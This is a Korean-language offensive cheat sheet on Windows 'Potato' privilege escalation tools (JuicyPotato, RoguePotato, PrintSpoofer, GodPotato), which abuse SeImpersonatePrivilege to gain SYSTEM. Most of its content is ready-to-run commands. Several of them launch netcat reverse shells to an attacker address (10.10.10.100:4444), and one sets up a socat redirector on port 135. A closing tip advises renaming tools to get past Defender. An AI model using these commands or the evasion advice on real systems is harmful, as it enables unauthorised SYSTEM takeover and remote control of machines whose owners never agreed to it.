# Windows 포테이토 권한상승 시리즈

- SeImpersonatePrivilege(또는 SeAssignPrimaryTokenPrivilege)를 가진 서비스 계정(IIS, MSSQL, WinRM 세션 등)이 SYSTEM 토큰을 복제하게 만드는 DCOM·RPC·named pipe 기반 권한상승 도구 계열. JuicyPotato → RoguePotato → PrintSpoofer → GodPotato 순서로 호환 범위가 넓어졌다.
- web·sql 서비스 셸이 서비스 계정으로 떨어졌을 때(whoami /priv에서 SeImpersonatePrivilege 활성), 타깃 Windows 버전에 맞는 도구를 고를 때, 어떤 도구가 어느 버전까지 커버하는지 정리가 필요할 때.
- 타깃에 맞는 exe 업로드, RoguePotato는 인증을 받아줄 공격자 호스트(135 포워딩), PrintSpoofer는 Print Spooler 서비스 구동. 상세 실행 예시는 windows/privileges/PrintSpoofer.md 문서 참조.

## 공통 전제

```
whoami /priv
# SeImpersonatePrivilege 또는 SeAssignPrimaryTokenPrivilege가 Enabled면 후보
```

- 이 권한은 서비스 계정에 기본 부여된다. 일반 유저 계정에는 없으므로 적용 대상이 아니다.

## JuicyPotato — Win10 1809 / Server 2019 미만

```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\out.txt" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

- `-l`: COM 청취 포트. `-p -a`: 실행 프로그램·인자. `-t *`: 토큰 생성 방식 전부 시도. `-c`: CLSID(타깃 OS별 목록에서 골라야 한다).
- Win10 1809·Server 2019부터 RPCSS 동작 변경으로 막혔다.

## RoguePotato — Server 2019·Win10 1809+

```
RoguePotato.exe -r 10.10.10.100@9999 -e "C:\temp\nc.exe 10.10.10.100 4444 -e cmd.exe" -l 1337
```

- 공격자 호스트에서 리다이렉터가 필요하다: socat TCP-LISTEN:135,reuseaddr,fork TCP:<타깃IP>:9999
- `-r`: 원격 COM 서버(IP@포트). `-e`: 실행 명령. `-l`: 로컬 청취 포트.
- OXID 리졸버 우회를 위해 공격자 측 135 포트 포워딩이 핵심이다.

## PrintSpoofer — Server 2016~2022·Win10/11

```
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "C:\temp\nc.exe 10.10.10.100 4444 -e cmd.exe"
```

- Print Spooler 서비스의 SYSTEM 토큰을 named pipe 스푸핑으로 받아온다. 스풀러가 꺼져 있으면 안 통한다.
- `-i`: SYSTEM 셸을 현재 콘솔로 가져옴. `-c`: 실행 명령. 세부 문서는 windows/privileges/PrintSpoofer.md.

## GodPotato — Server 2012~2022·Win8~11

```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 10.10.10.100 4444"
```

- .NET 버전별 빌드(GodPotato-NET2.exe, -NET3.exe, -NET4.exe) 중 타깃에 설치된 .NET에 맞춰 고른다. NET2는 .NET 2.0/3.5만 있는 구형 서버용.
- `-cmd`: 실행 명령. `-clsid`: 커스텀 CLSID 지정. RPCSS OXID 처리 결함을 이용해 OS 버전 의존성이 가장 낮다.

## 선택 기준

- Server 2016 이하 → JuicyPotato. Server 2019·Win10 1809+ → PrintSpoofer(스풀러 구동 시) 또는 RoguePotato·GodPotato.
- 최신 환경(Server 2022·2025 포함)에서는 GodPotato가 사실상 표준이다.
- 도구가 말 없이 죽으면 CLSID 미지원 → .NET 버전 → 스풀러 부재 순서로 확인한다.

## 팁·트러블슈팅

- 모든 포테이토는 SeImpersonate가 비활성이면 무용지물이다. whoami /priv부터 확인.
- Defender가 대부분을 탐지한다. 실행 직후 삭제되면 이름·경로 변경이나 덤프 기반 흐름을 검토.
- JuicyPotato CLSID는 타깃 OS 버전별 목록에서 골라야 하고, 기본 CLSID가 실패하면 다른 CLSID로 재시도.
- 리버스 셸 명령의 공백은 따옴표로 감싸야 인자가 깨지지 않는다.
